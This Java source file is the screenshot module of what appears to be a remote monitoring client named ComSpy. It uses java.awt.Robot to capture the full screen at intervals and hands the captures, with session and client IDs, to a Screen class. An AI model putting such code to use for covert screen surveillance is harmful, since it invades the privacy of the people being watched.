/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package screencaptcher;

import static Comman.KeysVer.Args;
import compy_client.ComSpy;
import Comman.KeysVer.Keys;
import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author abaza
 */
public class ScreenShot_Impilmantation {
    compy_client.ComSpy ComSpy = null;
    private screencaptcher.Screen SSC;
//    private Connection Con = null;

    public void Status(compy_client.ComSpy ComSpy ,Boolean SwitchKey, int Delay) {
        this.ComSpy = ComSpy;
        if (!SwitchKey) {
            Delay = 0;
        }
        screenchopt(SwitchKey, Delay);
    }

    private void screenchopt(boolean run, int sco) {
        try {
            Robot robot = null;
            Rectangle rectangle = null;
            Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
            GraphicsEnvironment gEnv = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice gDev = gEnv.getDefaultScreenDevice();
            rectangle = new Rectangle(dim);
            robot = new Robot(gDev);
            if ((sco == 0) && (run == false)) {
                if (SSC != null) {
                    SSC.end();
                    SSC = null;
                    System.gc();
                    System.out.println("Screenshot Stop");
                    return;
                }
            }
            long Sleep = sco * 1000;
            System.out.println("Screenshot Start");
            SSC = new Screen(Sleep, robot, rectangle, Args.get(Keys.SUUID), Args.get(Keys.CUUID),this.ComSpy);
        } catch (AWTException ex) {
            Logger.getLogger(ComSpy.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

}
